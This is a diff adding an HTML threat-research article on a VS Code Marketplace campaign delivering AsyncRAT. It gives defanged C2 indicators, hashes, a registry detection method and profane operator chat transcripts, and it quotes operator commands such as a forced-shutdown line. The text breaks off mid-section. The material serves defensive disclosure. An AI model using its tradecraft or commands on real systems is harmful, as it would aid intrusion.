@@ -1,0 +1,1232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Inside a 216-Extension VS Code Marketplace Campaign Delivering AsyncRAT</title>
+<style>
+
+
+:root {
+  --bg: #161a22;
+  --surface: #1e232d;
+  --surface2: #262c38;
+  --ink: #f0f4f8;
+  --body: #d2dae3;
+  --dim: #9aa8b8;
+  --red: #f87171;
+  --amber: #fbbf24;
+  --green: #34d399;
+  --cyan: #38bdf8;
+  --purple: #c084fc;
+  --line: #2e3646;
+}
+* { box-sizing: border-box; }
+html { background: var(--bg); scroll-behavior: smooth; }
+body {
+  margin: 0;
+  background: var(--bg);
+  color: var(--body);
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+  line-height: 1.82;
+  font-size: 1.16rem;
+  -webkit-font-smoothing: antialiased;
+}
+article {
+  max-width: 980px;
+  margin: 0 auto;
+  padding: 50px 28px 100px;
+}
+h1 {
+  font-size: 2.65rem;
+  line-height: 1.25;
+  color: var(--ink);
+  margin: 0 0 20px;
+  letter-spacing: -0.025em;
+  font-weight: 800;
+}
+.subtitle {
+  font-size: 1.28rem;
+  color: var(--dim);
+  line-height: 1.55;
+  margin-bottom: 28px;
+}
+.byline {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  flex-wrap: wrap;
+  gap: 12px;
+  padding: 16px 0;
+  border-top: 1px solid var(--line);
+  border-bottom: 1px solid var(--line);
+  margin-bottom: 38px;
+  font-size: 0.94rem;
+  color: var(--dim);
+}
+.byline b { color: var(--ink); }
+h2 {
+  font-size: 1.75rem;
+  color: var(--ink);
+  margin: 52px 0 18px;
+  padding-bottom: 10px;
+  border-bottom: 1px solid var(--line);
+  letter-spacing: -0.015em;
+  font-weight: 750;
+}
+h3 {
+  font-size: 1.34rem;
+  color: var(--cyan);
+  margin: 34px 0 14px;
+  font-weight: 700;
+}
+h4 {
+  font-size: 1.15rem;
+  color: var(--ink);
+  margin: 26px 0 10px;
+  font-weight: 650;
+}
+p { margin: 0 0 20px; }
+a { color: var(--cyan); text-decoration: none; }
+a:hover { text-decoration: underline; }
+ul, ol {
+  margin: 0 0 24px;
+  padding-left: 28px;
+}
+li { margin-bottom: 9px; }
+code {
+  font-family: 'JetBrains Mono', Consolas, Monaco, monospace;
+  font-size: 0.9em;
+  background: var(--surface2);
+  padding: 2px 7px;
+  border-radius: 5px;
+  color: #fca5a5;
+  border: 1px solid rgba(255, 255, 255, 0.07);
+}
+pre {
+  background: #101319;
+  border: 1px solid var(--line);
+  border-left: 3px solid var(--cyan);
+  padding: 18px 22px;
+  border-radius: 8px;
+  overflow-x: auto;
+  font-family: 'JetBrains Mono', Consolas, Monaco, monospace;
+  font-size: 0.92rem;
+  line-height: 1.6;
+  color: #dbe4ee;
+  margin: 22px 0 28px;
+}
+pre code {
+  background: transparent;
+  padding: 0;
+  border: none;
+  color: inherit;
+}
+blockquote {
+  margin: 24px 0;
+  padding: 16px 22px;
+  background: var(--surface);
+  border-left: 4px solid var(--amber);
+  border-radius: 0 8px 8px 0;
+  color: #edf2f7;
+  font-style: italic;
+}
+.takeaways {
+  background: linear-gradient(180deg, rgba(30, 35, 45, 0.8) 0%, rgba(24, 28, 36, 0.8) 100%);
+  border: 1px solid var(--line);
+  border-left: 4px solid var(--cyan);
+  border-radius: 10px;
+  padding: 24px 28px;
+  margin: 34px 0;
+}
+.takeaways h3 {
+  margin-top: 0;
+  color: var(--ink);
+  font-size: 1.25rem;
+}
+.takeaways ul { margin-bottom: 0; }
+.takeaways li { margin-bottom: 11px; font-size: 1.05rem; }
+.chat-term {
+  background: #101319;
+  border: 1px solid var(--line);
+  border-radius: 10px;
+  overflow: hidden;
+  margin: 26px 0;
+  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+}
+.chat-term .bar {
+  background: #181d26;
+  padding: 11px 18px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  border-bottom: 1px solid var(--line);
+  font-size: 0.84rem;
+  color: var(--dim);
+  font-family: 'JetBrains Mono', monospace;
+}
+.chat-term .body {
+  padding: 20px 22px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.94rem;
+  line-height: 1.65;
+}
+.chat-term .op { color: #f87171; font-weight: 700; }
+.chat-term .me { color: #38bdf8; font-weight: 700; }
+.chat-term .sys { color: #fbbf24; }
+.chat-term .hl { color: #fde047; font-weight: 700; }
+figure {
+  margin: 34px 0;
+}
+.fig-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 14px;
+}
+figure img {
+  width: 100%;
+  border-radius: 8px;
+  border: 1px solid var(--line);
+  display: block;
+  cursor: zoom-in;
+  transition: transform 0.15s ease;
+}
+figcaption {
+  margin-top: 11px;
+  font-size: 0.9rem;
+  color: var(--dim);
+  text-align: center;
+  line-height: 1.5;
+}
+figcaption b { color: var(--ink); }
+table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 24px 0 32px;
+  font-size: 0.92rem;
+  background: var(--surface);
+  border: 1px solid var(--line);
+  border-radius: 8px;
+  overflow: hidden;
+}
+th, td {
+  padding: 12px 16px;
+  text-align: left;
+  border-bottom: 1px solid var(--line);
+  vertical-align: top;
+}
+th {
+  background: var(--surface2);
+  color: var(--ink);
+  font-weight: 700;
+  text-transform: uppercase;
+  font-size: 0.78rem;
+  letter-spacing: 0.05em;
+}
+tr:last-child td { border-bottom: none; }
+td.mono {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.86rem;
+}
+.diagram-box {
+  background: #11151c;
+  border: 1px solid var(--line);
+  border-radius: 10px;
+  padding: 24px;
+  margin: 28px 0;
+}
+.funnel-wave-card {
+  background: rgba(22, 26, 34, 0.85);
+  border: 1px solid var(--line);
+  border-top: 3px solid #f59e0b;
+  border-radius: 8px;
+  padding: 15px 16px;
+  font-size: 0.88rem;
+  line-height: 1.55;
+}
+.funnel-wave-card p {
+  margin: 0;
+  font-size: 0.86rem;
+  color: var(--body);
+  line-height: 1.52;
+}
+.funnel-top-box {
+  width: 100%;
+  background: linear-gradient(180deg, rgba(245, 158, 11, 0.05) 0%, rgba(30, 35, 45, 0.95) 100%);
+  border: 1px solid rgba(245, 158, 11, 0.28);
+  border-radius: 12px;
+  padding: 20px 22px;
+  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25);
+}
+.funnel-stage {
+  position: relative;
+  background: var(--surface);
+  border: 1px solid var(--line);
+  border-radius: 10px;
+  padding: 18px 22px;
+  box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
+  display: grid;
+  grid-template-columns: 225px 1fr 245px;
+  gap: 18px;
+  align-items: center;
+}
+.cp-body {
+  font-size: 0.91rem;
+  line-height: 1.55;
+  color: var(--body);
+}
+.cp-lock {
+  background: rgba(22, 26, 34, 0.9);
+  border: 1px solid var(--line);
+  border-radius: 7px;
+  padding: 12px 14px;
+  font-size: 0.84rem;
+  line-height: 1.48;
+}
+.funnel-svg-neck {
+  width: 100%;
+  max-width: 820px;
+  height: 64px;
+  display: block;
+  margin: -2px auto;
+}
+.funnel-stage {
+  position: relative;
+  background: var(--surface);
+  border: 1px solid var(--line);
+  border-radius: 10px;
+  padding: 16px 20px;
+  box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
+  display: grid;
+  grid-template-columns: 215px 1fr 235px;
+  gap: 16px;
+  align-items: center;
+}
+.funnel-stage.cp-1 { width: 100%; border-left: 4px solid #3b82f6; background: linear-gradient(90deg, rgba(59,130,246,0.08) 0%, var(--surface) 35%); }
+.funnel-stage.cp-2 { width: 95%;  border-left: 4px solid #06b6d4; background: linear-gradient(90deg, rgba(6,182,212,0.08) 0%, var(--surface) 35%); }
+.funnel-stage.cp-3 { width: 90%;  border-left: 4px solid #a855f7; background: linear-gradient(90deg, rgba(168,85,247,0.08) 0%, var(--surface) 35%); }
+.funnel-stage.cp-4 { width: 85%;  border-left: 4px solid #ef4444; background: linear-gradient(90deg, rgba(239,68,68,0.11) 0%, var(--surface) 40%); border-color: rgba(239,68,68,0.4); }
+
+.cp-meta .cp-badge {
+  display: inline-block;
+  font-size: 0.68rem;
+  font-weight: 800;
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  padding: 2px 8px;
+  border-radius: 4px;
+  margin-bottom: 5px;
+}
+.cp-1 .cp-badge { background: rgba(59,130,246,0.18); color: #60a5fa; border: 1px solid rgba(59,130,246,0.35); }
+.cp-2 .cp-badge { background: rgba(6,182,212,0.18); color: #22d3ee; border: 1px solid rgba(6,182,212,0.35); }
+.cp-3 .cp-badge { background: rgba(168,85,247,0.18); color: #c084fc; border: 1px solid rgba(168,85,247,0.35); }
+.cp-4 .cp-badge { background: rgba(239,68,68,0.2); color: #f87171; border: 1px solid rgba(239,68,68,0.4); }
+
+.cp-meta h4 {
+  margin: 0 0 3px 0;
+  font-size: 0.98rem;
+  font-weight: 700;
+  color: #fff;
+}
+.cp-meta .cp-sub {
+  font-size: 0.75rem;
+  color: var(--muted);
+  font-family: var(--mono);
+}
+.cp-body {
+  font-size: 0.82rem;
+  line-height: 1.52;
+  color: var(--text);
+}
+.cp-lock {
+  background: rgba(11, 15, 25, 0.85);
+  border: 1px solid var(--line);
+  border-radius: 7px;
+  padding: 10px 12px;
+  font-size: 0.77rem;
+  line-height: 1.45;
+}
+.cp-lock .lock-label {
+  display: block;
+  font-size: 0.66rem;
+  font-weight: 800;
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  color: #34d399;
+  margin-bottom: 3px;
+}
+.cp-4 .cp-lock {
+  border-color: rgba(239,68,68,0.35);
+}
+.cp-4 .cp-lock .lock-label {
+  color: #f87171;
+}
+.funnel-arrow {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  margin: 3px 0;
+  color: var(--muted);
+  font-size: 0.72rem;
+  font-family: var(--mono);
+  line-height: 1;
+}
+@media (max-width: 820px) {
+  .funnel-waves-grid { grid-template-columns: 1fr; }
+  .funnel-stage, .funnel-stage.cp-1, .funnel-stage.cp-2, .funnel-stage.cp-3, .funnel-stage.cp-4 {
+    width: 100%;
+    grid-template-columns: 1fr;
+    gap: 10px;
+  }
+  .funnel-svg-neck { height: 36px; }
+}
+
+
+
+@media print {
+  @page {
+    size: A4;
+    margin: 0;
+  }
+  html, body {
+    -webkit-print-color-adjust: exact !important;
+    print-color-adjust: exact !important;
+    background: #161a22 !important;
+    color: #d2dae3 !important;
+    margin: 0 !important;
+  }
+  body {
+    padding: 14mm 14mm !important;
+  }
+  article {
+    max-width: 100% !important;
+    padding: 8px 4px !important;
+  }
+  pre, figure, .funnel-stage, .funnel-top-box, .callout, .rat-profile-card {
+    break-inside: avoid;
+    page-break-inside: avoid;
+  }
+  pre {
+    white-space: pre-wrap !important;
+    word-break: break-all !important;
+  }
+}
+
+</style>
+</head>
+<body>
+
+<article>
+  <h1>Inside a 216-Extension VS Code Marketplace Campaign Delivering AsyncRAT</h1>
+  <div class="subtitle">
+    Tracking a six-month operation across 201 publisher accounts, a 150-extension sleeper wave, live operator sessions on TCP 56001, and the "Pebble" (<code>@pxbbz</code>) "dev hitter" campaign targeting Roblox studios.
+  </div>
+
+  <div class="byline">
+    <div>Oct 25, 2026 &middot; <b>@James</b></div>
+    <div>14 min read</div>
+  </div>
+
+  <p>
+    Since at least May 2026, a small, hands-on crew has run an aggressive malware distribution campaign on the Visual Studio Code Marketplace targeting game developers and general software engineers. <b>The campaign remains actively operational today:</b> as recently as October 24, 2026, the operators were observed deploying fresh delivery hosts, re-arming extensions, and actively piloting live command-and-control sessions. Across six months, the operation has published 216 extension versions under 201 distinct publisher accounts, rotating from bundled npm post-install scripts to a fleet of 150 empty "sleeper" extensions and an Ed25519-signed script-delivery protocol.
+  </p>
+  <p>
+    Unlike most malicious VS Code extension campaigns that run an automated infostealer and exit, this group deploys a ConfuserEx-packed AsyncRAT implant (internal assembly name <code>Xdggym</code>) and pilots infected machines manually. My sandbox recorded 64 detonations that reached their command-and-control (C2) servers on TCP port <code>56001</code>. In 13 of those sessions, an operator at the panel pushed interactive plugins to the host; in another 12 runs, an automated server rule recognized the sandbox hardware ID and killed the implant within three seconds of check-in.
+  </p>
+  <p>
+    During four of the interactive sessions, the operators opened chat windows or dialog boxes on the sandbox desktop. On Saturday, October 24, 2026, within 35 seconds of a batch stager from <code>pebblexvale[.]com/pxbbzVkahQ5VT.bat</code> injecting the RAT into <code>explorer.exe</code> and connecting to <code>216[.]107[.]137[.]77:56001</code>, the operator opened a hidden desktop (HVNC) shell and launched a window titled <code>Chat with H@cker</code>:
+  </p>
+
+  <div class="chat-term">
+    <div class="bar"><span>Chat with H@cker + PowerShell MessageBox</span><span class="mono">2026-10-24 17:30 to 17:32 UTC</span></div>
+    <div class="body">
+      <div><span class="op">H@cker:</span>       what do u want</div>
+      <div><span class="sys">Notification:</span> <span class="hl">hello sirclicksalot what do u want</span></div>
+    </div>
+  </div>
+
+  <p>
+    When nobody replied in the chat window, the operator opened <code>cmd.exe</code> from the injected process, ran a PowerShell command to pop up a system <code>MessageBox</code> greeting my older sandbox username (<code>sirclicksalot</code>) by name, and at 17:33:31 UTC clicked <b>IDA Free 9.1</b> on the taskbar before disconnecting.
+  </p>
+
+  <figure>
+    <div class="fig-grid">
+      <img src="screenshots/1792862759193/screenshot_screen0_1792863247.png" alt="Chat with H@cker and Notification MessageBox" onclick="openLightbox(this.src)">
+      <img src="screenshots/1792862759193/screenshot_screen0_1792863337.png" alt="Operator launches IDA Free 9.1" onclick="openLightbox(this.src)">
+    </div>
+    <figcaption><b>Left (17:32 UTC):</b> The operator opens <code>Chat with H@cker</code> and triggers a PowerShell MessageBox reading <code>"hello sirclicksalot what do u want"</code>. <b>Right (17:33:31 UTC):</b> The operator launches IDA Free 9.1 from the sandbox taskbar before dropping the connection.</figcaption>
+  </figure>
+
+  <p>
+    While taunting the lab and reusing a single cPanel server (<code>192[.]142[.]48[.]98</code>) for over seven weeks, the operators linked their stager domains directly to a self-published persona named "Pebble" (<code>@pxbbz</code> / <code>pebblezn</code> / <code>viapeq</code>), two compromised Roblox game studios (Dark Cube Studio and Second Games), a Rolimon's trading account (<code>pxbbz</code>), and a credit-card fraud shop (<code>dump-central[.]cc</code>).
+  </p>
+
+  <h2>1. Detecting Hands-on-Keyboard Sessions via the Registry Plugin Cache</h2>
+  <p>
+    The campaign's payload is a 412 KB .NET executable with the internal assembly name <code>Xdggym</code> (SHA-256: <code>252d53dcbb481b1d2f60a874f83fab057c3e69d7e0f04b2115c70df51cc98c62</code>), a ConfuserEx-packed build from the AsyncRAT / Quasar lineage (consistent with AsyncRAT, DcRat, or VenomRAT). Its configuration exists only on the heap at runtime, where heap extraction recovered both the C2 endpoints and the pinned server certificate.
+  </p>
+
+  <div class="takeaways" style="border-left: 4px solid var(--purple, #c084fc); background: linear-gradient(180deg, rgba(30, 27, 50, 0.7) 0%, rgba(20, 18, 35, 0.7) 100%);">
+    <h3 style="color: #c084fc; margin-top: 0;">Implant Profile: The Xdggym AsyncRAT Build</h3>
+    <ul style="margin-bottom: 0;">
+      <li><b>Transport &amp; JA3:</b> TLS over TCP port <code>56001</code> (with <code>56002</code> and <code>56003</code> as fallbacks in earlier waves) using length-prefixed, GZip-compressed frames and a 5-second beacon interval. The client handshake produces JA3 fingerprint <code>fc54e0d16d9764783542f0146a98b300</code>, the standard signature for default AsyncRAT .NET sockets tracked by Abuse.ch SSLBL since 2021.</li>
+      <li><b>Pinned Certificate:</b> All three C2 servers present the same self-signed certificate <code>CN=Hlkfsmwtezz</code> (SHA-256: <code>8ae8963b7158976f16b7525cbed1ca910dc39800e7660bb7a1e2611ce264f59e</code>).</li>
+      <li><b>Check-in Reconnaissance:</b> Once injected into <code>explorer.exe</code>, the implant runs 13 WMI <code>ManagementObjectSearcher</code> queries, enumerates running processes, checks antivirus and administrator status, and captures a desktop screenshot roughly 40 seconds after connecting on engaged sessions.</li>
+      <li><b>Registry Plugin Cache:</b> Interactive features (Remote Desktop, HVNC, Chat, Remote Shell, and Power/Uninstall) are not compiled into the base binary. When an operator selects a tool on the panel, the server streams a compiled .NET DLL over TLS, and the client caches it under <code>HKCU\Software\&lt;32-hex MD5 HWID&gt;\&lt;32-hex plugin hash&gt;</code>.</li>
+    </ul>
+  </div>
+
+  <p>
+    Because every sandbox VM boots from a clean snapshot where <code>HKCU\Software\&lt;HWID&gt;</code> does not exist, any registry write under that key means the C2 server actively pushed a plugin during that run. Across the 64 runs that reached port <code>56001</code>, the registry telemetry split into three groups:
+  </p>
+  <ul>
+    <li><b>~40 idle check-ins:</b> The implant connected, completed its initial WMI inventory, and never wrote a plugin key. Nobody interacted with the session.</li>
+    <li><b>12 automated blocklist kills (September 20, 16:54 UTC to September 21, 15:52 UTC):</b> Within 1 to 3 seconds of connecting (at all hours of the day), the server pushed plugin <code>ab389ed6431d49986712b549511df12f</code>, which immediately uninstalled the client and dropped the connection. Because the RAT derives its 32-hex victim ID from hardware and user attributes, the ID survived VM snapshot reverts, allowing the operators to add my sandbox IDs to an automated kill rule within 12 days of first contact.</li>
+    <li><b>13 hands-on operator sessions:</b> An operator manually pushed Remote Desktop, HVNC, Chat, or Shell plugins to inspect or interact with the sandbox.</li>
+  </ul>
+
+  <h3>Observed Panel Plugins and Host Actions</h3>
+  <p>
+    The RAT names each registry value after the MD5 hash of the plugin binary. Comparing the timestamp of each registry write against process creation and window events within the following 0 to 2 seconds identifies the role of 15 of the 18 plugins observed across September and October 2026:
+  </p>
+  <div style="overflow-x:auto; margin: 20px 0;">
+    <table>
+      <thead>
+        <tr>
+          <th>Plugin Hash</th>
+          <th>Dates Seen</th>
+          <th>Inferred Role</th>
+          <th>Host Activity Within 0 to 2 Seconds of Arrival</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td class="mono">3d576a5f698f86c72d046f424a8a41b3</td>
+          <td>Oct 02, Oct 06</td>
+          <td>Remote Desktop</td>
+          <td>Visible desktop control; operator launches <code>chrome.exe</code> and <code>Code.exe</code> and types into local windows.</td>
+        </tr>
+        <tr>
+          <td class="mono">00e41f4a0fd50dfb83b01be06b3cc108</td>
+          <td>Oct 06</td>
+          <td>Chat</td>
+          <td>Arrives 4 seconds before the WinForms chat window (<code>riched20.dll</code>) opens as <code>"Chat with SirRatter"</code> and <code>"Chat with SirFucksMotherAlot"</code>.</td>
+        </tr>
+        <tr>
+          <td class="mono">28fda9a6bb11be6cddc7cd81623089e1</td>
+          <td>Oct 02, Oct 06</td>
+          <td>HVNC (Hidden Desktop)</td>
+          <td>Arrives 1 second before a second <code>explorer.exe</code> shell spawns on a hidden desktop where VS Code is opened out of view of the screen recorder.</td>
+        </tr>
+        <tr>
+          <td class="mono">650d64fca9a24713b07f520d056527f1</td>
+          <td>Oct 02, Oct 05, Oct 06</td>
+          <td>Power / Uninstall</td>
+          <td>Arrives in the same second as <code>cmd.exe /c shutDown /s /t 0</code> or <code>Unregister-ScheduledTask</code>.</td>
+        </tr>
+        <tr>
+          <td class="mono">e9c00d25ff70086851b293e3970b31db</td>
+          <td>Oct 05</td>
+          <td>Unknown</td>
+          <td>Arrives 2 seconds before <code>notepad.exe</code> opens the RAT's local persistence script (<code>gRpp.vbs</code>) from the injected shell.</td>
+        </tr>
+        <tr>
+          <td class="mono">61d09b0898632bc8763c32c1e4bdf97d</td>
+          <td>Oct 24 (3 runs)</td>
+          <td>Remote Desktop / Info (New Set)</td>
+          <td>First plugin pushed across all three Oct 24 sessions (13 to 23 seconds after connect).</td>
+        </tr>
+        <tr>
+          <td class="mono">a9bc6d2c639b7f45e53025ff36ca6100</td>
+          <td>Oct 24</td>
+          <td>HVNC (New Set)</td>
+          <td>Arrives in the same second as a secondary hidden-desktop <code>explorer.exe</code> process.</td>
+        </tr>
+        <tr>
+          <td class="mono">db9bb008c09219a6f8e86cfa6ab979fe</td>
+          <td>Oct 24</td>
+          <td>Chat (New Set)</td>
+          <td>Arrives 10 seconds before the <code>"Chat with H@cker"</code> window opens.</td>
+        </tr>
+        <tr>
+          <td class="mono">c3d90e0d0743ee7675888c4f8ac51040</td>
+          <td>Oct 24</td>
+          <td>Remote Shell (New Set)</td>
+          <td>Arrives 2 seconds before <code>cmd.exe</code> spawns from injected <code>explorer.exe</code> to run the PowerShell <code>MessageBox</code> command.</td>
+        </tr>
+        <tr>
+          <td class="mono">2a3bd460ab14441e2000a95636d6598a</td>
+          <td>Oct 24</td>
+          <td>Power / Uninstall (New Set)</td>
+          <td>Arrives in the same second as <code>Unregister-ScheduledTask "Explorer"</code>.</td>
+        </tr>
+        <tr>
+          <td class="mono">e7177f2fa162a204ff26ab11a7017e4d</td>
+          <td>Oct 24 (2 runs)</td>
+          <td>Unknown (New Set)</td>
+          <td>Pushed alongside HVNC and Remote Shell during the Oct 24 sessions.</td>
+        </tr>
+        <tr>
+          <td class="mono">ba44ffdc62eb5b98e94cef1f29cff7bb</td>
+          <td>Sep 08</td>
+          <td>HVNC (Wave-1 Set)</td>
+          <td>Secondary <code>explorer.exe</code> spawns 1 second after arrival (first recorded hands-on session, <code>HypeShowG.fastmusicgen</code>).</td>
+        </tr>
+        <tr>
+          <td class="mono">a4a6bb35b4798b10f49c8f85bd7b221b</td>
+          <td>Sep 08</td>
+          <td>Wave-1 Set</td>
+          <td>Pushed alongside <code>ba44ffdc62eb5b98e94cef1f29cff7bb</code> and <code>2f4e7b6712acde4bae5a39d59ed74585</code>.</td>
+        </tr>
+        <tr>
+          <td class="mono">2f4e7b6712acde4bae5a39d59ed74585</td>
+          <td>Sep 08</td>
+          <td>Wave-1 Set</td>
+          <td>Pushed during the September 8 hands-on session.</td>
+        </tr>
+        <tr>
+          <td class="mono">51d83519dadcedc1d2aa12dc0ce664d6</td>
+          <td>Sep 15 to Sep 21</td>
+          <td>Wave-1 Set</td>
+          <td>Shared across both <code>216[.]107[.]139[.]88</code> and <code>185[.]94[.]29[.]79</code> within days.</td>
+        </tr>
+        <tr>
+          <td class="mono">da67e64cd37b841acc0fe6920c872b0d</td>
+          <td>Sep 15 to Sep 21</td>
+          <td>HVNC (Wave-1 Set)</td>
+          <td>Secondary <code>explorer.exe</code> spawns in the same second.</td>
+        </tr>
+        <tr>
+          <td class="mono">795f12eb5fbd41ac7faaed42c0860246</td>
+          <td>Sep 15 to Sep 21</td>
+          <td>Wave-1 Set</td>
+          <td>Pushed during the <code>PhanBanLLC.BoardlyUp</code> session on September 21.</td>
+        </tr>
+        <tr>
+          <td class="mono">ab389ed6431d49986712b549511df12f</td>
+          <td>Sep 15 to Sep 21</td>
+          <td>Power / Uninstall (Wave-1 Set)</td>
+          <td>Triggers immediate uninstall or shutdown; also sent automatically within 1 to 3 seconds to blocklisted sandbox HWIDs.</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+  <p>
+    Every plugin hash changed between October 6 and October 24, coinciding with a payload size shift from roughly 432 KB to 300,439 bytes and indicating a panel rebuild or fork update.
+  </p>
+
+  <h2>2. Live Chat Transcripts and Operator Behavior</h2>
+  <p>
+    On October 6, 2026, between 02:05 and 02:28 UTC, two batch droppers (<code>xqbiw5s4j2.bat</code> and <code>jmhu0sljrl.bat</code>) connected to <code>216[.]107[.]137[.]77:56001</code> during unattended sandbox runs. In both sessions, the C2 server pushed Remote Desktop (<code>3d576a5f698f86c72d046f424a8a41b3</code>), HVNC (<code>28fda9a6bb11be6cddc7cd81623089e1</code>), and Chat (<code>00e41f4a0fd50dfb83b01be06b3cc108</code>).
+  </p>
+  <p>
+    Every line in both transcripts came through the RAT connection. The hypervisor task log confirmed no console session was open on either VM, the batch detonation harness has no keystroke-injection path, and no guest RDP session was active. The lines prefixed with <code>"Me:"</code> were typed into the victim-side input box on the desktop over the RAT's Remote Desktop plugin while the chat window was open.
+  </p>
+
+  <div class="chat-term">
+    <div class="bar"><span>"Chat with SirRatter" (xqbiw5s4j2.bat &rarr; 216[.]107[.]137[.]77:56001)</span><span class="mono">2026-10-06 02:05 to 02:13 UTC</span></div>
+    <div class="body">
+      <div><span class="op">SirRatter:</span> What do u want</div>
+      <div><span class="op">SirRatter:</span> Like all u do is stalk us</div>
+      <div><span class="op">SirRatter:</span> U dont get paid for this</div>
+      <div><span class="me">Me:</span>        cs im gay</div>
+      <div><span class="op">SirRatter:</span> whats ur discord?</div>
+      <div><span class="op">SirRatter:</span> <span class="hl">you abby john and all the other people are losers</span></div>
+      <div><span class="op">SirRatter:</span> what do you want though, ur obsessed with our ext</div>
+      <div><span class="me">Me:</span>        We wanna make visaul studio a better place</div>
+      <div><span class="me">Me:</span>        A safer place</div>
+      <div><span class="me">Me:</span>        And you malware geeks ruin the place for everyone</div>
+      <div><span class="op">SirRatter:</span> Whos we</div>
+      <div><span class="op">SirRatter:</span> ?</div>
+      <div><span class="me">Me:</span>        <span class="hl">Silence, Pebble</span></div>
+      <div><span class="op">SirRatter:</span> <span class="hl">what the fuckk</span></div>
+    </div>
+  </div>
+
+  <p>
+    During this session, the operator also opened Chrome on the visible desktop, navigated to <code>pornhub[.]com</code> and a <code>nubilefilms[.]com</code> sign-up page, dragged the chat window beside the browser, and immediately after the <code>"Silence, Pebble"</code> / <code>"what the fuckk"</code> exchange, sent the power plugin and ran <code>cmd /c shutDown /s /t 0</code>. Six minutes later, a second session connected under the handle <code>SirFucksMotherAlot</code> (mocking my sandbox username <code>sirclicksalot</code>), opened VS Code on a hidden HVNC desktop, and typed another two-sided exchange:
+  </p>
+
+  <div class="chat-term">
+    <div class="bar"><span>"Chat with SirFucksMotherAlot" (jmhu0sljrl.bat &rarr; 216[.]107[.]137[.]77:56001)</span><span class="mono">2026-10-06 02:19 to 02:28 UTC</span></div>
+    <div class="body">
+      <div><span class="op">SirFucksMotherAlot:</span> what are you doing back</div>
+      <div><span class="me">Me:</span>                 The best ingideant in Minecraft, is Cole and Diamonds.</div>
+      <div><span class="op">SirFucksMotherAlot:</span> yea?</div>
+      <div><span class="op">SirFucksMotherAlot:</span> <span class="hl">all you did was find the roblox devfourm posts</span></div>
+      <div><span class="op">SirFucksMotherAlot:</span> ur not special</div>
+      <div><span class="me">Me:</span>                 I am your god from now on.</div>
+      <div><span class="me">Me:</span>                 <span class="hl">Tell Andrej I said Welcome.</span></div>
+    </div>
+  </div>
+
+  <figure>
+    <div class="fig-grid">
+      <img src="screenshots/crop_chat_sirratter_2.png" alt="Chat with SirRatter Silence Pebble" onclick="openLightbox(this.src)">
+      <img src="screenshots/1791252382944/screenshot_screen0_1791264463.png" alt="Chat with SirFucksMotherAlot" onclick="openLightbox(this.src)">
+    </div>
+    <figcaption><b>Left:</b> <code>SirRatter</code> reacting to <code>"Silence, Pebble"</code> with <code>"what the fuckk"</code> moments before shutting down the VM. <b>Right:</b> <code>SirFucksMotherAlot</code> referencing <i>"the roblox devfourm posts"</i> (referencing community expos&eacute;s of Pebble's dev-hitting spree like <a href="https://www.youtube.com/watch?v=ig2VbeaqFwA&amp;t=37s" target="_blank" rel="noopener">Blitfum's video investigation</a>) and <i>"Andrej"</i>.</figcaption>
+  </figure>
+
+  <h3>Interpreting the Two-Sided Chat Telemetry</h3>
+  <p>
+    Because the operators typed humiliating or theatrical lines in the victim's voice (<code>"cs im gay"</code>, <code>"We wanna make visaul studio a better place"</code>, <code>"I am your god from now on"</code>) while leaving an adult sign-up page on screen for my screenshot recorder, whether those transcripts represent one operator typing both sides as theater for the analyst or two co-operators sharing the same AsyncRAT panel is unresolved:
+  </p>
+  <ul>
+    <li><b>Two panel operators overlapping:</b> In AsyncRAT, multiple operators can share one server panel. If one operator opened the Chat window as <code>SirRatter</code> while a second crew member already had the Remote Desktop window open on the same VM, the second operator typing <code>"Silence, Pebble"</code> into the victim box to prank his co-operator explains why <code>"Whos we?"</code> and <code>"what the fuckk"</code> read like genuine surprise, followed by an immediate forced shutdown. Likewise, <code>"Tell Andrej I said Welcome"</code> reads as one person addressing a third party through the chat log.</li>
+    <li><b>One operator staging a transcript for the sandbox logs:</b> Alternatively, a single operator who recognized the analysis VM may have typed both sides to mock the researchers they believed were reviewing the screenshots (naming <code>"abby"</code>, <code>"john"</code>, and <code>"Andrej"</code>).</li>
+    <li><b>Why the attribution lead holds either way:</b> Regardless of whether one operator typed both sides or a co-operator typed the <code>"Me:"</code> lines over Remote Desktop, the string <code>"Pebble"</code> was introduced entirely from the C2 connection on October 6, eighteen days before the crew registered <code>pebblexvale[.]com</code> and served <code>pxbbzVkahQ5VT.bat</code>.</li>
+  </ul>
+  <p>
+    Across all nine hands-on sessions, operator timestamps clustered strictly between 13:40 and 02:42 UTC (with zero activity between 03:00 and 13:00 UTC), and 156 of the 216 Marketplace versions were published in two evening windows (21:00 to 22:00 UTC and 01:00 to 02:00 UTC), fitting US afternoon and evening hours (09:00 to 23:00 EDT), weekends included. Whenever they recognized the sandbox, they never ran credential dumpers, <code>lsass</code> access, or <code>whoami</code> / <code>systeminfo</code> commands; instead, they inspected VS Code or IDA Free, taunted the lab, and uninstalled or shut the VM down within 1 to 10 minutes.
+  </p>
+
+  <h3>Decrypted TLS 1.3 Session &amp; cPanel Verification (<code>LKKStuner.linkintree</code>, October 24, 2026)</h3>
+  <p>
+    During the 15:14 UTC detonation of <code>LKKStuner.linkintree</code> (version 1.0.2) on October 24, the sandbox <code>SSLKEYLOGFILE</code> recorder (<code>keylogs/1792853892145.log</code>, 148,958 bytes; alongside <code>keylogs/1792850105388.log</code>, 4,690 bytes from the <code>studiotask-app</code> run) captured the TLS 1.3 session secrets across 190 encrypted connections. Decrypting the PCAP separated the malware's automated traffic from my own interactive browser check of the stager IP during that run:
+  </p>
+  <ol>
